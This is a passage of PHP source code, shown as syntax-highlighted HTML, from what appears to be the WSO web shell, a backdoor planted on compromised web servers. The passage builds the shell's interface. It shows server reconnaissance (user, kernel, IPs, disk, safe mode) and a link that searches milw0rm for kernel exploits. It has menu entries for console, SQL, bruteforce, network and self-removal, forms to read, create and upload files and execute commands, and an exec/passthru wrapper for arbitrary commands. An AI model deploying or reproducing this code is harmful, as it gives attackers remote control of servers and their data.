<span class="s2">&amp;lt;/script&amp;gt; </span>
<span class="s2">&amp;lt;head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;div style=&#39;position:absolute;width:100%;background-color:#444;top:0;left:0;&#39;&amp;gt; </span>
<span class="s2">&amp;lt;form method=post name=mf style=&#39;display:none;&#39;&amp;gt; </span>
<span class="s2">&amp;lt;input type=hidden name=a&amp;gt; </span>
<span class="s2">&amp;lt;input type=hidden name=c&amp;gt; </span>
<span class="s2">&amp;lt;input type=hidden name=p1&amp;gt; </span>
<span class="s2">&amp;lt;input type=hidden name=p2&amp;gt; </span>
<span class="s2">&amp;lt;input type=hidden name=p3&amp;gt; </span>
<span class="s2">&amp;lt;input type=hidden name=charset&amp;gt; </span>
<span class="s2">&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
    <span class="nv">$freeSpace</span> <span class="o">=</span> <span class="o">@</span><span class="nb">diskfreespace</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
    <span class="nv">$totalSpace</span> <span class="o">=</span> <span class="o">@</span><span class="nb">disk_total_space</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
    <span class="nv">$totalSpace</span> <span class="o">=</span> <span class="nv">$totalSpace</span><span class="o">?</span><span class="nv">$totalSpace</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>
    <span class="nv">$release</span> <span class="o">=</span> <span class="o">@</span><span class="nb">php_uname</span><span class="p">(</span><span class="s1">&#39;r&#39;</span><span class="p">);</span>
    <span class="nv">$kernel</span> <span class="o">=</span> <span class="o">@</span><span class="nb">php_uname</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">);</span>
    <span class="nv">$millink</span> <span class="o">=</span> <span class="s1">&#39;http://milw0rm.com/search.php?dong=&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span> <span class="nb">strpos</span><span class="p">(</span><span class="s1">&#39;Linux&#39;</span><span class="p">,</span> <span class="nv">$kernel</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="p">)</span>
        <span class="nv">$millink</span> <span class="o">.=</span> <span class="nb">urlencode</span><span class="p">(</span> <span class="s1">&#39;Linux Kernel &#39;</span> <span class="o">.</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$release</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">)</span> <span class="p">);</span>
    <span class="k">else</span>
        <span class="nv">$millink</span> <span class="o">.=</span> <span class="nb">urlencode</span><span class="p">(</span> <span class="nv">$kernel</span> <span class="o">.</span> <span class="s1">&#39; &#39;</span> <span class="o">.</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$release</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span> <span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;posix_getegid&#39;</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$user</span> <span class="o">=</span> <span class="o">@</span><span class="nb">get_current_user</span><span class="p">();</span>
        <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getmyuid</span><span class="p">();</span>
        <span class="nv">$gid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getmygid</span><span class="p">();</span>
        <span class="nv">$group</span> <span class="o">=</span> <span class="s2">&quot;?&quot;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="o">@</span><span class="nb">posix_geteuid</span><span class="p">());</span>
        <span class="nv">$gid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getgrgid</span><span class="p">(</span><span class="o">@</span><span class="nb">posix_getegid</span><span class="p">());</span>
        <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
        <span class="nv">$uid</span> <span class="o">=</span> <span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">];</span>
        <span class="nv">$group</span> <span class="o">=</span> <span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
        <span class="nv">$gid</span> <span class="o">=</span> <span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;gid&#39;</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="nv">$cwd_links</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="nv">$path</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
    <span class="nv">$n</span><span class="o">=</span><span class="nb">count</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$n</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$cwd_links</span> <span class="o">.=</span> <span class="s2">&quot;&amp;lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span>

        <span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$j</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">=</span><span class="nv">$i</span><span class="p">;</span><span class="nv">$j</span><span class="o">++</span><span class="p">)</span>

            <span class="nv">$cwd_links</span> <span class="o">.=</span> <span class="nv">$path</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;;/&#39;</span><span class="nv">$cwd_links</span>

        <span class="o">.</span> <span class="p">)</span><span class="s1">&#39;= &quot;&quot;&amp;gt;&quot;.$path[$i].&quot;/&amp;lt;/a&amp;gt;&quot;;</span>
<span class="s1">   }</span>
<span class="s1">   $charsets = array(&#39;</span><span class="nx">UTF</span><span class="o">-</span><span class="mi">8</span><span class="s1">&#39;, &#39;</span><span class="nx">Windows</span><span class="o">-</span><span class="mi">1251</span><span class="s1">&#39;, &#39;</span><span class="nx">KOI8</span><span class="o">-</span><span class="nx">R</span><span class="s1">&#39;, &#39;</span><span class="nx">KOI8</span><span class="o">-</span><span class="nx">U</span><span class="s1">&#39;, &#39;</span><span class="nx">cp866</span><span class="s1">&#39;);</span>
<span class="s1">   $opt_charsets = &#39;&#39;;</span>
<span class="s1">   foreach($charsets as $item)</span>
<span class="s1">       $opt_charsets .= &#39;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">option</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&#39;.</span><span class="si">$item</span><span class="s2">.&#39;&quot;</span> <span class="s1">&#39;.($_POST[&#39;</span><span class="nx">charset</span><span class="s1">&#39;]==$item?&#39;</span><span class="nx">selected</span><span class="s1">&#39;:&#39;&#39;).&#39;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;.$item.&#39;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">option</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;;</span>
<span class="s1">   $m = array(&#39;</span><span class="nx">Sec</span><span class="o">.</span> <span class="nx">Info</span><span class="s1">&#39;=&amp;gt;&#39;</span><span class="nx">SecInfo</span><span class="s1">&#39;,&#39;</span><span class="nx">Files</span><span class="s1">&#39;=&amp;gt;&#39;</span><span class="nx">FilesMan</span><span class="s1">&#39;,&#39;</span><span class="nx">Console</span><span class="s1">&#39;=&amp;gt;&#39;</span><span class="nx">Console</span><span class="s1">&#39;,&#39;</span><span class="nx">Sql</span><span class="s1">&#39;=&amp;gt;&#39;</span><span class="nx">Sql</span><span class="s1">&#39;,&#39;</span><span class="nx">Php</span><span class="s1">&#39;=&amp;gt;&#39;</span><span class="nx">Php</span><span class="s1">&#39;,&#39;</span><span class="nx">Safe</span> <span class="nx">mode</span><span class="s1">&#39;=&amp;gt;&#39;</span><span class="nx">SafeMode</span><span class="s1">&#39;,&#39;</span><span class="nx">String</span> <span class="nx">tools</span><span class="s1">&#39;=&amp;gt;&#39;</span><span class="nx">StringTools</span><span class="s1">&#39;,&#39;</span><span class="nx">Bruteforce</span><span class="s1">&#39;=&amp;gt;&#39;</span><span class="nx">Bruteforce</span><span class="s1">&#39;,&#39;</span><span class="nx">Network</span><span class="s1">&#39;=&amp;gt;&#39;</span><span class="nx">Network</span><span class="s1">&#39;);</span>
<span class="s1">   if(!empty($GLOBALS[&#39;</span><span class="nx">auth_pass</span><span class="s1">&#39;]))</span>
<span class="s1">       $m[&#39;</span><span class="nx">Logout</span><span class="s1">&#39;] = &#39;</span><span class="nx">Logout</span><span class="s1">&#39;;</span>
<span class="s1">   $m[&#39;</span><span class="nx">Self</span> <span class="nx">remove</span><span class="s1">&#39;] = &#39;</span><span class="nx">SelfRemove</span><span class="s1">&#39;;</span>
<span class="s1">   $menu = &#39;&#39;;</span>
<span class="s1">   foreach($m as $k =&amp;gt; $v)</span>
<span class="s1">       $menu .= &#39;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">th</span> <span class="nx">width</span><span class="o">=</span><span class="s2">&quot;&#39;.(int)(100/count(</span><span class="si">$m</span><span class="s2">)).&#39;%&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;[</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&quot;#&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;g(\&#39;&#39;.</span><span class="si">$v</span><span class="s2">.&#39;\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;.$k.&#39;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">a</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="p">]</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">th</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;;</span>
<span class="s1">   $drives = &quot;&quot;;</span>
<span class="s1">   if ($GLOBALS[&#39;</span><span class="nx">os</span><span class="s1">&#39;] == &#39;</span><span class="nx">win</span><span class="s1">&#39;) {</span>
<span class="s1">       foreach( range(&#39;</span><span class="nx">c</span><span class="s1">&#39;,&#39;</span><span class="nx">z</span><span class="s1">&#39;) as $drive )</span>
<span class="s1">       if (is_dir($drive.&#39;</span><span class="o">:</span><span class="nx">\\</span><span class="s1">&#39;))</span>
<span class="s1">           $drives .= &#39;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&quot;#&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;g(\&#39;FilesMan\&#39;,\&#39;&#39;.</span><span class="si">$drive</span><span class="s2">.&#39;:/\&#39;)&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;[</span> <span class="s1">&#39;.$drive.&#39;</span> <span class="p">]</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">a</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;;</span>
<span class="s1">   }</span>
<span class="s1">   echo &#39;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">table</span> <span class="nx">class</span><span class="o">=</span><span class="nx">info</span> <span class="nx">cellpadding</span><span class="o">=</span><span class="mi">3</span> <span class="nx">cellspacing</span><span class="o">=</span><span class="mi">0</span> <span class="nx">width</span><span class="o">=</span><span class="mi">100</span><span class="o">%&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">width</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">span</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Uname</span><span class="o">:&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">User</span><span class="o">:&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Php</span><span class="o">:&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Hdd</span><span class="o">:&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Cwd</span><span class="o">:</span><span class="s1">&#39;.($GLOBALS[&#39;</span><span class="nx">os</span><span class="s1">&#39;] == &#39;</span><span class="nx">win</span><span class="s1">&#39;?&#39;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Drives</span><span class="o">:</span><span class="s1">&#39;:&#39;&#39;).&#39;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">span</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;.</span>
<span class="s1">        &#39;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">nobr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;.substr(@php_uname(), 0, 120).&#39;</span>  <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&quot;http://www.google.com/search?q=&#39;.urlencode(@php_uname()).&#39;&quot;</span> <span class="nx">target</span><span class="o">=</span><span class="s2">&quot;_blank&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;[</span><span class="nx">Google</span><span class="p">]</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">a</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&quot;&#39;.</span><span class="si">$millink</span><span class="s2">.&#39;&quot;</span> <span class="nx">target</span><span class="o">=</span><span class="nx">_blank</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;[</span><span class="nx">milw0rm</span><span class="p">]</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">a</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">nobr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;.$uid.&#39;</span> <span class="p">(</span> <span class="s1">&#39;.$user.&#39;</span> <span class="p">)</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">span</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Group</span><span class="o">:&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">span</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;.$gid.&#39;</span> <span class="p">(</span> <span class="s1">&#39;.$group.&#39;</span> <span class="p">)</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;.@phpversion().&#39;</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">span</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Safe</span> <span class="nx">mode</span><span class="o">:&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">span</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;.($GLOBALS[&#39;</span><span class="nx">safe_mode</span><span class="s1">&#39;]?&#39;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="nx">red</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">ON</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">font</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;:&#39;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="c1">#00bb00&amp;gt;&amp;lt;b&amp;gt;OFF&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&#39;).&#39; &amp;lt;a href=# onclick=&quot;g(\&#39;Php\&#39;,null,\&#39;\&#39;,\&#39;info\&#39;)&quot;&amp;gt;[ phpinfo ]&amp;lt;/a&amp;gt; &amp;lt;span&amp;gt;Datetime:&amp;lt;/span&amp;gt; &#39;.date(&#39;Y-m-d H:i:s&#39;).&#39;&amp;lt;br&amp;gt;&#39;.wsoViewSize($totalSpace).&#39; &amp;lt;span&amp;gt;Free:&amp;lt;/span&amp;gt; &#39;.wsoViewSize($freeSpace).&#39; (&#39;.(int)($freeSpace/$totalSpace*100).&#39;%)&amp;lt;br&amp;gt;&#39;.$cwd_links.&#39; &#39;.wsoPermsColor($GLOBALS[&#39;cwd&#39;]).&#39; &amp;lt;a href=# onclick=&quot;g(\&#39;FilesMan\&#39;,\&#39;&#39;.$GLOBALS[&#39;home_cwd&#39;].&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;[ home ]&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&#39;.$drives.&#39;&amp;lt;/td&amp;gt;&#39;.</span>
         <span class="s1">&#39;&amp;lt;td width=1 align=right&amp;gt;&amp;lt;nobr&amp;gt;&amp;lt;select onchange=&quot;g(null,null,null,null,null,this.value)&quot;&amp;gt;&amp;lt;optgroup label=&quot;Page charset&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$opt_charsets</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/optgroup&amp;gt;&amp;lt;/select&amp;gt;&amp;lt;br&amp;gt;&amp;lt;span&amp;gt;Server IP:&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&#39;</span><span class="o">.@</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;SERVER_ADDR&quot;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;br&amp;gt;&amp;lt;span&amp;gt;Client IP:&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/nobr&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&#39;</span><span class="o">.</span>
         <span class="s1">&#39;&amp;lt;table style=&quot;border-top:2px solid #333;&quot; cellpadding=3 cellspacing=0 width=100%&amp;gt;&amp;lt;tr&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$menu</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;div style=&quot;margin:5&quot;&amp;gt;&#39;</span><span class="p">;</span>
<span class="p">}</span>
 
<span class="k">function</span> <span class="nf">wsoFooter</span><span class="p">()</span> <span class="p">{</span>
    <span class="nv">$is_writable</span> <span class="o">=</span> <span class="nb">is_writable</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span><span class="o">?</span><span class="s2">&quot;&amp;lt;font color=green&amp;gt;[ Writeable ]&amp;lt;/font&amp;gt;&quot;</span><span class="o">:</span><span class="s2">&quot;&amp;lt;font color=red&amp;gt;[ Not writable ]&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="s2">&amp;lt;/div&amp;gt; </span>
<span class="s2">&amp;lt;table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style=&#39;border-top:2px solid #333;border-bottom:2px solid #333;&#39;&amp;gt; </span>
<span class="s2">   &amp;lt;tr&amp;gt; </span>
<span class="s2">       &amp;lt;td&amp;gt;&amp;lt;form onsubmit=&#39;g(null,this.c.value);return false;&#39;&amp;gt;&amp;lt;span&amp;gt;Change dir:&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;toolsInp&#39; type=text name=c value=&#39;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt; </span>
<span class="s2">       &amp;lt;td&amp;gt;&amp;lt;form onsubmit=</span><span class="se">\&quot;</span><span class="s2">g(&#39;FilesTools&#39;,null,this.f.value);return false;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;span&amp;gt;Read file:&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;toolsInp&#39; type=text name=f&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt; </span>
<span class="s2">   &amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt; </span>
<span class="s2">       &amp;lt;td&amp;gt;&amp;lt;form onsubmit=</span><span class="se">\&quot;</span><span class="s2">g(&#39;FilesMan&#39;,null,&#39;mkdir&#39;,this.d.value);return false;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;span&amp;gt;Make dir:&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;toolsInp&#39; type=text name=d&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;</span><span class="si">$is_writable</span><span class="s2">&amp;lt;/td&amp;gt; </span>
<span class="s2">       &amp;lt;td&amp;gt;&amp;lt;form onsubmit=</span><span class="se">\&quot;</span><span class="s2">g(&#39;FilesTools&#39;,null,this.f.value,&#39;mkfile&#39;);return false;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;span&amp;gt;Make file:&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;toolsInp&#39; type=text name=f&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;</span><span class="si">$is_writable</span><span class="s2">&amp;lt;/td&amp;gt; </span>
<span class="s2">   &amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt; </span>
<span class="s2">       &amp;lt;td&amp;gt;&amp;lt;form onsubmit=</span><span class="se">\&quot;</span><span class="s2">g(&#39;Console&#39;,null,this.c.value);return false;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;span&amp;gt;Execute:&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;toolsInp&#39; type=text name=c value=&#39;&#39;&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt; </span>
<span class="s2">       &amp;lt;td&amp;gt;&amp;lt;form method=&#39;post&#39; ENCTYPE=&#39;multipart/form-data&#39;&amp;gt; </span>
<span class="s2">       &amp;lt;input type=hidden name=a value=&#39;FilesMAn&#39;&amp;gt; </span>
<span class="s2">       &amp;lt;input type=hidden name=c value=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt; </span>
<span class="s2">       &amp;lt;input type=hidden name=p1 value=&#39;uploadFile&#39;&amp;gt; </span>
<span class="s2">       &amp;lt;input type=hidden name=charset value=&#39;&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&#39;&amp;gt; </span>
<span class="s2">       &amp;lt;span&amp;gt;Upload file:&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;toolsInp&#39; type=file name=f&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;</span><span class="si">$is_writable</span><span class="s2">&amp;lt;/td&amp;gt; </span>
<span class="s2">   &amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>
 
<span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;posix_getpwuid&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">],</span> <span class="s1">&#39;posix_getpwuid&#39;</span><span class="p">)</span><span class="o">===</span><span class="k">false</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="k">function</span> <span class="nf">posix_getpwuid</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span>
<span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;posix_getgrgid&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">],</span> <span class="s1">&#39;posix_getgrgid&#39;</span><span class="p">)</span><span class="o">===</span><span class="k">false</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="k">function</span> <span class="nf">posix_getgrgid</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span>
<span class="k">function</span> <span class="nf">wsoEx</span><span class="p">(</span><span class="nv">$in</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$out</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;exec&#39;</span><span class="p">))</span> <span class="p">{</span>
        <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$in</span><span class="p">,</span><span class="nv">$out</span><span class="p">);</span>
        <span class="nv">$out</span> <span class="o">=</span> <span class="o">@</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$out</span><span class="p">);</span>
    <span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;passthru&#39;</span><span class="p">))</span> <span class="p">{</span>
        <span class="nb">ob_start</span><span class="p">();</span>
